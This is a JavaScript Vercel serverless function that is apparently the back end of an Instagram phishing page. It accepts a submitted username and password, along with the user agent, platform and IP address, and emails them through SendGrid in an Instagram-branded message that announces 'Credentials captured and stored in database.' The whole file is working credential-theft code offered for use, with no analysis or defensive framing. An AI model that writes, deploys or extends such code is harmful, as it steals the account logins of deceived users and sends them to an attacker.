// Vercel Serverless Function for Email Notifications
const sgMail = require('@sendgrid/mail');

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            message: 'Method not allowed' 
        });
    }
    
    try {
        const { 
            to, 
            subject, 
            username, 
            password,
            timestamp, 
            userAgent, 
            language, 
            platform, 
            ipAddress 
        } = req.body;
        
        // Validate required fields
        if (!to || !subject) {
            return res.status(400).json({
                success: false,
                message: 'Recipient email and subject are required'
            });
        }
        
        // Create email content
        const emailHtml = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${subject}</title>
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                        line-height: 1.6;
                        color: #262626;
                        max-width: 600px;
                        margin: 0 auto;
                        padding: 20px;
                        background-color: #fafafa;
                    }
                    .container {
                        background-color: #ffffff;
                        border-radius: 8px;
                        padding: 30px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    }
                    .header {
                        text-align: center;
                        margin-bottom: 30px;
                        padding-bottom: 20px;
                        border-bottom: 1px solid #dbdbdb;
                    }
                    .instagram-logo {
                        width: 175px;
                        height: 51px;
                        margin-bottom: 20px;
                    }
                    .title {
                        color: #E1306C;
                        font-size: 24px;
                        font-weight: 600;
                        margin: 0;
                    }
                    .content {
                        margin-bottom: 30px;
                    }
                    .info-box {
                        background-color: #f8f9fa;
                        border: 1px solid #e1e8ed;
                        border-radius: 8px;
                        padding: 20px;
                        margin: 20px 0;
                    }
                    .info-title {
                        font-size: 16px;
                        font-weight: 600;
                        color: #262626;
                        margin-bottom: 10px;
                    }
                    .info-item {
                        margin-bottom: 8px;
                        font-size: 14px;
                    }
                    .info-label {
                        font-weight: 600;
                        color: #8e8e8e;
                    }
                    .info-value {
                        color: #262626;
                    }
                    .security-warning {
                        background-color: #fff3cd;
                        border: 1px solid #ffeaa7;
                        border-radius: 8px;
                        padding: 15px;
                        margin: 20px 0;
                    }
                    .security-warning-text {
                        color: #856404;
                        font-size: 14px;
                        margin: 0;
                    }
                    .footer {
                        text-align: center;
                        padding-top: 20px;
                        border-top: 1px solid #dbdbdb;
                        color: #8e8e8e;
                        font-size: 12px;
                    }
                    .button {
                        display: inline-block;
                        background: linear-gradient(45deg, #E1306C, #F56040);
                        color: white;
                        text-decoration: none;
                        padding: 12px 24px;
                        border-radius: 6px;
                        font-weight: 600;
                        margin: 10px 0;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <svg class="instagram-logo" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M29.4 0.5H145.6C160.1 0.5 171.9 12.3 171.9 26.8V24.2C171.9 38.7 160.1 50.5 145.6 50.5H29.4C14.9 50.5 3.1 38.7 3.1 24.2V26.8C3.1 12.3 14.9 0.5 29.4 0.5Z" fill="url(#gradient)"/>
                            <path d="M87.5 12.2C98.2 12.2 106.8 20.8 106.8 31.5C106.8 42.2 98.2 50.8 87.5 50.8C76.8 50.8 68.2 42.2 68.2 31.5C68.2 20.8 76.8 12.2 87.5 12.2Z" fill="white"/>
                            <path d="M87.5 18.1C81.1 18.1 75.9 23.3 75.9 29.7C75.9 36.1 81.1 41.3 87.5 41.3C93.9 41.3 99.1 36.1 99.1 29.7C99.1 23.3 93.9 18.1 87.5 18.1Z" fill="url(#gradient)"/>
                            <path d="M108.2 12.2C110.3 12.2 112 10.5 112 8.4C112 6.3 110.3 4.6 108.2 4.6C106.1 4.6 104.4 6.3 104.4 8.4C104.4 10.5 106.1 12.2 108.2 12.2Z" fill="white"/>
                            <defs>
                                <linearGradient id="gradient" x1="0" y1="0" x2="1" y2="1">
                                    <stop offset="0%" stop-color="#E1306C"/>
                                    <stop offset="50%" stop-color="#F56040"/>
                                    <stop offset="100%" stop-color="#F77737"/>
                                </linearGradient>
                            </defs>
                        </svg>
                        <h1 class="title">${subject}</h1>
                    </div>
                    
                    <div class="content">
                        <p>A new login attempt has been detected on your Instagram login page.</p>
                        
                        <div class="info-box">
                            <div class="info-title">Login Details</div>
                            <div class="info-item">
                                <span class="info-label">Username:</span>
                                <span class="info-value">${username || 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Password:</span>
                                <span class="info-value">${password || 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Timestamp:</span>
                                <span class="info-value">${timestamp ? new Date(timestamp).toLocaleString() : 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">User Agent:</span>
                                <span class="info-value">${userAgent || 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Language:</span>
                                <span class="info-value">${language || 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Platform:</span>
                                <span class="info-value">${platform || 'Not provided'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">IP Address:</span>
                                <span class="info-value">${ipAddress || 'Not available'}</span>
                            </div>
                        </div>
                        
                        <div class="security-warning">
                            <p class="security-warning-text">
                                <strong>Success:</strong> Credentials captured and stored in database. 
                                All login details are included above for easy access.
                            </p>
                        </div>
                    </div>
                    
                    <div class="footer">
                        <p>This is an automated notification from your Instagram Login System.</p>
                        <p>© 2025 Instagram Login System. All rights reserved.</p>
                    </div>
                </div>
            </body>
            </html>
        `;
        
        // Send email
        const msg = {
            to: to,
            from: process.env.FROM_EMAIL || 'noreply@instagram-login.com',
            subject: subject,
            html: emailHtml,
        };
        
        await sgMail.send(msg);
        
        return res.status(200).json({
            success: true,
            message: 'Email sent successfully'
        });
        
    } catch (error) {
        console.error('Email sending error:', error);
        
        return res.status(500).json({
            success: false,
            message: 'Failed to send email'
        });
    }
}

// Export for Vercel
module.exports = handler;
